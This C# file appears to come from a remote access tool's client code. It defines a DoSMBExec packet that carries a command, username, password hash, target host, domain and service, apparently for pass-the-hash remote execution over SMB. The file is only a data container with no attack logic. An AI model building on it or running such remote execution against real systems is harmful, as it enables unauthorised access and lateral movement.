using System;
using System.Collections.Generic;
using xClient.Core.Networking;
using System.Linq;
using System.Text;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoSMBExec : IPacket

        {
            public string command { get; set; }
            public string username { get; set; }
            public string hash { get; set; }
            public string target { get; set; }
            public string domain { get; set; }
            public string service { get; set; }
            public bool smb1 { get; set; }
            public bool comspec { get; set; }
            public int sleep { get; set; }

            public DoSMBExec()
            {

            }
            public DoSMBExec(string command, string username, string hash, string target, string domain, string service, bool smb1, bool comspec, int sleep)
            {
            this.command = command;
            this.username = username;
            this.hash = hash;
            this.target = target;
            this.domain = domain;
            this.service = service;
            this.smb1 = smb1;
            this.comspec = comspec;
            this.sleep = sleep;

            }

            public void Execute(Client client)
            {
                client.Send(this);
            }
        }
}
